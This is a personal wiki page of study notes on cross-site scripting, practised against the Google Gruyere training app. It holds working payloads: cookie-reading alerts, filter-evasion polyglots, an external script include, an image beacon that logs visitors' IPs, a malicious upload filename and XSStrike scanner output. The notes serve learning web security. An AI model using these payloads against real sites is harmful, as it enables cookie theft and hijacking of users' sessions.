Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.4
Creation-Date: 2019-02-17T08:08:29-05:00

====== Web Apps ======
Created Sunday 17 February 2019

== Resources ==
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

== Character Reference ==
https://www.w3schools.com/tags/ref_urlencode.asp
<SPACE> = %20
< = %3C
> = %3E

You can use encodeURIComponent() function in JS to see how a character will be encoded

alert(encodeURIComponent(" "));

==== XSS ====

[[JavaScript]] can be executed when placed in the URL. This can be used to force a user to execute a malicious script. For example, consider the following URL

http://google-gruyere.appspot.com/616346501855275632490103008973611384349/<script>alert("TEST")</script>

or written equivalently

http://google-gruyere.appspot.com/616346501855275632490103008973611384349/%3Cscript%3Ealert(%22TEST%22);%3C/script%3E

When the get request is sent, we get the following pop up, which indicates this site is vulnerable to XSS.

{{.\pasted_image.png}}

We can then run a more nefarious scripts like 

* eval(String.fromCharCode(...))
* alert(document.cookie);


You could change the background color of the website to blue
<script>document.body.style.backgroundColor="blue"</script>

== Overview of XSS ==
http://google-gruyere.appspot.com/part2
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md
To understand how this could happen: suppose the URL https://www.google.com/search?q=flowers returns a page containing the HTML fragment

'''
<p>Your search for 'flowers'
returned the following results:</p>
'''


that is, the value of the query parameter q is inserted verbatim into the page returned by Google. If www.google.com did not do any validation or escaping of q (it does), an attacker could craft a link that looks like this:

https://www.google.com/search?q=flowers+%3Cscript%3Eevil_script()%3C/script%3E
and trick a victim into clicking on this link. When a victim loads this link, the following page gets rendered in the victim's browser:

'''
<p>Your search for 'flowers<script>evil_script()</script>'
returned the following results:</p>
'''


And the browser executes evil_script(). And since the page comes from www.google.com, evil_script() is executed in the context of www.google.com and has access to all the victim's browser state and cookies for that domain. Because of this, the fix for XSS is to host the content of a webpage on a separate domain than

Note that the victim does not even need to explicitly click on the malicious link. Suppose the attacker owns www.evil.example.com, and creates a page with an <iframe> pointing to the malicious link; if the victim visits www.evil.example.com, the attack will silently be activated.

== XSS Fuzzing ==
Normally, websites sanitize all input to not allow characters such as "<", or ">" and the like. However, it is possible to construct a XSS using other combinations of characters, taking advantage of the fact that 

< = %3C
> = %3E

For this, we can use a tool called a fuzzer to create many possible combinations of strings to see if any of them work. However, below we show some tests that can be done without a fuzzer, simply append the bellow scripts to the end of the URI
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

* Basic test
	* <SCRIPT>alert("XSS vulnerable")</SCRIPT>
	* <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
* Polyglot test https://polyglot.innerht.ml/. Polyglot scripts attempt to find multiple XSS contexts at once, reducing manual effort.
	* javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
	* javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
* Embed image
	<img src='https://www.catster.com/wp-content/uploads/2017/12/A-gray-kitten-meowing.jpg';>
	This is useful because if you set the src="yourserver.com" you will see the request on your server and you can get the IP address of the person requesting it.
	

== Overview of Document Object Model ==
https://www.w3schools.com/jsref/coll_doc_images.asp
We have see above that we are able to interact with the properties of the "document" if XSS is possible. In general, the document has the properties below. Think of this as an API for the webpage.

For example, you could get all of the links in a webpage (or change all of the links in a web page) by running something like the following in a loop

<script>var i; for ( i = 0; i < document.links.length; i++){ alert(document.links.item(i))}</script>

'''
Document Object Properties and Methods
The following properties and methods can be used on HTML documents:

Property / Method	Description
activeElement		Returns the currently focused element in the document
addEventListener()	Attaches an event handler to the document
adoptNode()		Adopts a node from another document
anchors			Returns a collection of all <a> elements in the document that have a name attribute
applets			Returns a collection of all <applet> elements in the document
baseURI			Returns the absolute base URI of a document
body			Sets or returns the document's body (the <body> element)
close()			Closes the output stream previously opened with document.open()
cookie			Returns all name/value pairs of cookies in the document
charset			Deprecated. Use characterSet instead. Returns the character encoding for the document
characterSet		Returns the character encoding for the document
createAttribute()	Creates an attribute node
createComment()		Creates a Comment node with the specified text
createDocumentFragment()	Creates an empty DocumentFragment node
createElement()		Creates an Element node
createEvent()		Creates a new event
createTextNode()	Creates a Text node
defaultView		Returns the window object associated with a document, or null if none is available.
designMode		Controls whether the entire document should be editable or not.
doctype			Returns the Document Type Declaration associated with the document
documentElement		Returns the Document Element of the document (the <html> element)
documentMode		Returns the mode used by the browser to render the document
documentURI		Sets or returns the location of the document
			domain	Returns the domain name of the server that loaded the document
domConfig		Obsolete. Returns the DOM configuration of the document
embeds			Returns a collection of all <embed> elements the document
execCommand()		Invokes the specified clipboard operation on the element currently having focus.
forms			Returns a collection of all <form> elements in the document
fullscreenElement	Returns the current element that is displayed in fullscreen mode
fullscreenEnabled()	Returns a Boolean value indicating whether the document can be viewed in fullscreen mode
getElementById()	Returns the element that has the ID attribute with the specified value
getElementsByClassName()	Returns a NodeList containing all elements with the specified class name
getElementsByName()	Returns a NodeList containing all elements with a specified name
getElementsByTagName()	Returns a NodeList containing all elements with the specified tag name
hasFocus()		Returns a Boolean value indicating whether the document has focus
head			Returns the <head> element of the document
images			Returns a collection of all <img> elements in the document
implementation		Returns the DOMImplementation object that handles this document
importNode()		Imports a node from another document
inputEncoding		Returns the encoding, character set, used for the document
lastModified		Returns the date and time the document was last modified
links			Returns a collection of all <a> and <area> elements in the document that have a href attribute
normalize()		Removes empty Text nodes, and joins adjacent nodes
normalizeDocument()	Removes empty Text nodes, and joins adjacent nodes
open()			Opens an HTML output stream to collect output from document.write()
querySelector()		Returns the first element that matches a specified CSS selector(s) in the document
querySelectorAll()	Returns a static NodeList containing all elements that matches a specified CSS selector(s) in the document
readyState		Returns the (loading) status of the document
referrer		Returns the URL of the document that loaded the current document
removeEventListener()	Removes an event handler from the document (that has been attached with the addEventListener() method)
renameNode()		Renames the specified node
scripts			Returns a collection of <script> elements in the document
strictErrorChecking	Sets or returns whether error-checking is enforced or not
title			Sets or returns the title of the document
URL			Returns the full URL of the HTML document
write()			Writes HTML expressions or JavaScript code to a document
writeln()		Same as write(), but adds a newline character after each statement
'''


==== XSStrike ====
https://support.cloudflare.com/hc/en-us/articles/200172016-What-does-the-Web-Application-Firewall-WAF-do-
XSStrike can also detect if an application is runnning a Web Application Firewall (WAF), which can automatically filter out any illegitimate traffic. It looks at both GET and POST-based HTTP requests and applies a rule set, such as the ModSecurity core rule set covering the OWASP Top 10 vulnerabilities to determine what traffic to block, challenge, or let pass through. It can block comment spam, cross-site scripting attacks, and SQL injections.


'''
$ ./xsstrike.py -u http://google-gruyere.appspot.com/616346501855275632490103008973611384349/snippets.gtl?uid=cheddar

        XSStrike v3.1.2

 Checking for DOM vulnerabilities
 WAF Status: Offline
 Testing parameter: uid
 Reflections found: 3
 Analysing reflections
 Generating payloads
 Payloads generated: 9234
------------------------------------------------------------
 Payload: <dETaIlS%0aoNtOgglE%0d=%0d[8].find(confirm)>
 Efficiency: 100
 Confidence: 10
 Would you like to continue scanning? [y/N] y
------------------------------------------------------------
'''


You can then use the following URL

''http://google-gruyere.appspot.com/616346501855275632490103008973611384349/snippets.gtl?uid=cheddar<dETaIlS%0aoNtOgglE%0d=%0d[8].find(confirm)>''

You can also have XSStrike use its fuzzing tool to check what types of XSS scripts are able to be executed. [passed] means the script will execute.

'''
$ ./xsstrike.py -u http://google-gruyere.appspot.com/616346501855275632490103008973611384349/snippets.gtl?uid=cheddar --fuzzer

        XSStrike v3.1.2

 WAF Status: Offline
 Fuzzing parameter: uid
 [passed]   <test
 [passed]   <test//
 [passed]   <test>
 [passed]   <test x>
 [passed]   <test x=y
 [passed]   <test x=y//
 [passed]   <test/oNxX=yYy//
 [passed]   <test oNxX=yYy>
 [passed]   <test onload=x
 [passed]   <test/o%00nload=x
 [passed]   <test sRc=xxx
 [passed]   <test data=asa
 [passed]   <test data=javascript:asa
 [passed]   <svg x=y>
 [passed]   <details x=y//
 [passed]   <a href=x//
 [passed]   <emBed x=y>
 [passed]   <object x=y//
 [passed]   <bGsOund sRc=x>
 [passed]   <iSinDEx x=y//
 [passed]   <aUdio x=y>
 [passed]   <script x=y>
 [passed]   <script//src=//
'''


==== Alternative XSS Methods ====

== File Upload XSS ==
You can save an image with an XSS filename and upload it to the server (as an avatar for example).

“><img src=x onerror=prompt(document.domain)>

==== Stealing User Info With XSS ====

